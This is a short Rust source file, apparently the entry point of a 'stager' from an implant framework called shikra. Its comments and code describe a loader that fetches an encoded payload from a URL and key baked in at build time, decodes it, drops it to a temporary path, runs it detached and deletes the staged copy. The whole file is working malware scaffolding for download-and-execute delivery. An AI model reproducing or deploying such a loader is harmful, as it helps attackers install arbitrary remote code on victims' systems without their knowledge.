//! Minimal staged-delivery bootstrap.
//!
//! Built by `shikra-builder --stager`: downloads the encoded stage from the
//! URL baked in at build time, decodes it with the baked key, drops it to a
//! temporary path, launches it detached and exits.

use shikra_implant::{run_stager, StagerConfig};

fn env_or(key: &str, default: &str) -> String {
    option_env_any(key).unwrap_or_else(|| default.to_string())
}

fn option_env_any(key: &str) -> Option<String> {
    match key {
        "SHIKRA_STAGER_URL" => option_env!("SHIKRA_STAGER_URL").map(str::to_string),
        "SHIKRA_STAGER_KEY" => option_env!("SHIKRA_STAGER_KEY").map(str::to_string),
        "SHIKRA_STAGER_ARGS" => option_env!("SHIKRA_STAGER_ARGS").map(str::to_string),
        _ => None,
    }
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> anyhow::Result<()> {
    let url = env_or("SHIKRA_STAGER_URL", "");
    let key = env_or("SHIKRA_STAGER_KEY", "");
    if url.is_empty() || key.is_empty() {
        anyhow::bail!(
            "stager build is missing SHIKRA_STAGER_URL / SHIKRA_STAGER_KEY baked in by the builder"
        );
    }

    let arguments: Vec<String> = env_or("SHIKRA_STAGER_ARGS", "")
        .split_whitespace()
        .map(str::to_string)
        .collect();

    run_stager(StagerConfig {
        stage_url: url,
        stage_key_hex: key,
        output_path: None,
        delete_staged: true,
        arguments,
    })
    .await
}
